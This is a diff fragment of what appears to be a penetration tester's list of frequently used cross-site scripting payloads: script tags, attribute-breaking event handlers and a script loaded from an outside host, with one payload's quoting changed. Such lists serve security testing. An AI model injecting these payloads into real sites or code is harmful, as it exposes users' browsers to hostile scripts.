@@ -7,7 +7,7 @@ Frequently used Payloads:
 <script src=//14.rs>
 '"><script>alert(-1)</script><
 m"onmouseover="prompt(-11)
-n"onmouseover="prompt(-12)
+n'onmouseover='prompt(-12)
 <video><source src=x onerror=alert(-2)></video>
 '"></script><svg onload=prompt(-3)>
 '"></script><video><source src=x onerror=alert(-4)></video>
